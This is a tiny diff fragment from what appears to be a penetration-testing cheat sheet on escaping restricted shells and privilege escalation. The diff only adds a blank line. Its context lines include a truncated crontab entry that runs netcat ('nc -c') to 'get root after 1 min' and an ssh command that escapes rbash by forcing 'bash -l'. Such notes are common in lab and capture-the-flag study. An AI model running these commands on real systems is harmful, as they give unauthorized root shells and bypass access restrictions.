@@ -335,6 +335,7 @@ add to crontab to get root after 1 min <code>echo ' *  *  *  *  * /usr/bin/nc -c
 
 <b>From rbash to bash</b> <code>ssh user@10.10.10.10 -p 22 -t "bash -l"</code>
 
+
 <b>From crontab to bash</b>
 
 example 1.
